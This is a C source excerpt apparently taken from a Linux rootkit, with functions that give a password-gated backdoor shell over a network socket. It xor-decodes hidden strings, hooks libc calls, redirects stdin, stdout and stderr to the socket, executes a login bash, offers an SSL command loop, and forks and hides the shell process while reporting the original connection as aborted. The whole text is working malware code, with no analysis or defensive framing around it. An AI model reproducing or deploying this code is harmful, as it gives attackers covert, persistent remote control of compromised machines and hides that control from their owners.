void ptext_spawn_shell(int sockfd){
    char *argv[3];

    xor(bpath, BASH_PATH);
    argv[0] = strdup(bpath);
    clean(bpath);

    xor(lflag, LOGIN_FLAG);
    argv[1] = strdup(lflag);
    clean(lflag);

    argv[2] = NULL;

    hook(CCHDIR,
         CEXECVE);

    xor(idir, INSTALL_DIR);
    (void)call(CCHDIR, idir);     /* enter our installation directory */
    clean(idir);

    for(int i = 0; i < 3; i++) (void)dup2(sockfd, i);
#ifdef EXEC_PRE_SHELL
    xor(pre_shell, PRE_SHELL);
    (void)system(pre_shell);                     /* begin launching the shell */
    clean(pre_shell);
#endif
    (void)call(CEXECVE, argv[0], argv, NULL);    /* environment vars already set by is_bdusr() */
}

void backconnect(int method, int sockfd){
    char tmp[256];
    int got_pw;

    if(method == METHOD_PLAINTEXT){
        hook(CREAD);
        (void)call(CREAD, sockfd, tmp, sizeof(tmp) - 1);     /* read input from socket connection */
        tmp[strlen(tmp) - 1] = '\0';

        /* spawn a regular shell with plaintext communications */
#ifdef USE_CRYPT
        xor(bd_pwd, BD_PWD);
        got_pw = !strcmp(crypt(tmp, bd_pwd), bd_pwd);
        clean(bd_pwd);
#else
        got_pw = !xstrncmp(BD_PWD, tmp);
#endif

        if(got_pw)
        {
            memset(tmp, 0, strlen(tmp));
            ptext_spawn_shell(sockfd);
        }
    }

#ifdef ACCEPT_USE_SSL
    if(method == METHOD_SSL){
        ctx = InitCTX();
        ssl = SSL_new(ctx);
        SSL_set_fd(ssl, sockfd);
        sockfd = SSL_get_fd(ssl);

        if(SSL_accept(ssl)){
            SSL_read(ssl, tmp, sizeof(tmp) - 1);
            tmp[strlen(tmp) - 1] = '\0';

            #ifdef USE_CRYPT
            xor(bd_pwd, BD_PWD);
            got_pw = !strcmp(crypt(tmp, bd_pwd), bd_pwd);
            clean(bd_pwd);
            #else
            got_pw = !xstrncmp(BD_PWD, tmp);
            #endif

            if(got_pw){
                memset(tmp, 0, strlen(tmp));
                cmd_loop(sockfd);
            }
            SSL_CTX_free(ctx);
        }
    }
#endif
}

int drop_shell(int method, int sockfd){
    if(fork() == 0){
        (void)fsync(sockfd);
        (void)setsid();    /* start our own session */
        hide_self();       /* hide this new process */
        backconnect(method, sockfd);
        (void)close(sockfd);
        exit(0);
    }else{
        (void)close(sockfd);
        errno = ECONNABORTED;
        return -1;
    }

    return sockfd;
}